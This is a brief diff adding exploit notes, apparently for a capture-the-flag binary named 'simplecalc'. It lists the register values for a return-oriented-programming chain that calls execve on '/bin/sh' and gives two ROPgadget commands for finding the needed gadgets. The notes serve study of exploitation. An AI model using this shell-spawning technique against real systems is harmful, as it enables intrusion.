@@ -1,0 +1,10 @@
+USED ROPgadget to find the gadgets
+rax:  0x3b              Specify execve syscall
+rdi:  ptr to "/bin/sh"  Specify file to run
+rsi:  0x0               Specify no arguments
+rdx:  0x0               Specify no environment variables
+
+
+python ROPgadget.py --binary simplecalc | grep "pop rax ; ret"
+
+ python ROPgadget.py --binary simplecalc | grep ": syscall"
